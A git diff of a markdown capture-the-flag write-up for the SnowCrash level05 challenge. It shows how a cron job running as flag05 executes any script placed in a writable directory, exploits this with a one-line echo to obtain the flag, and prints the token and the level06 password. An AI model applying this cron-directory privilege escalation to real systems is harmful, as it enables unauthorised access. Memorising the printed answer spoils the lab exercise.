@@ -2,7 +2,8 @@
 
 ## Daily Mail
 
-- On login we received the followind message: `You have new mail`
+- On login we received the followind message: `You have new mail`.
+- The mail file path is indicated in the `MAIL` env variable.
 
 ```
 snow_crash git:(snow_crash) ✗ ssh -p6666 level05@127.0.0.1
@@ -22,15 +23,19 @@ level05@SnowCrash:~$ cat /var/spool/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
-# Cron job
+## Cron job
 
 - the mail content looks like a cron job line.
-- it executes every two minutes the following command: `su -c "sh /usr/sbin/openarenaserver"` as `flag05`
+- That line executes every two minutes the following command: `su -c "sh /usr/sbin/openarenaserver"` as `flag05`.
+
+## Openarenaserver
+
+- The `/usr/sbin/openarenaserver` exists and belongs to `flag05`.
+- It is a shell script.
+- It executes all files located in `/opt/openarenaserver/` and then remove them.
+- As `level05` user, we only have read rights on the script but we can write in `/opt/openarenaserver/` directory.
 
 ```
-evel05@SnowCrash:~$ find / -user flag05 2>/dev/null
-/usr/sbin/openarenaserver
-/rofs/usr/sbin/openarenaserver
 level05@SnowCrash:~$ ls -al /usr/sbin/openarenaserver
 -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
 level05@SnowCrash:~$ getfacl -a /usr/sbin/openarenaserver
@@ -75,8 +80,14 @@ default:mask::rwx
 default:other::r-x
 ```
 
+## Minute Mail
+
 ````
-echo "exec /bin/getflag > /tmp/soluc" > /opt/openarenaserver/easymoney.sh
-level05@SnowCrash:~$ cat /tmp/soluc
+echo "exec /bin/getflag > /tmp/flag" > /opt/openarenaserver/minutemail.sh
+level05@SnowCrash:~$ cat /tmp/flag
 Check flag.Here is your token : viuaaale9huek52boumoomioc```
 ````
+
+# Flag
+
+- `level06` password (flag): `viuaaale9huek52boumoomioc`
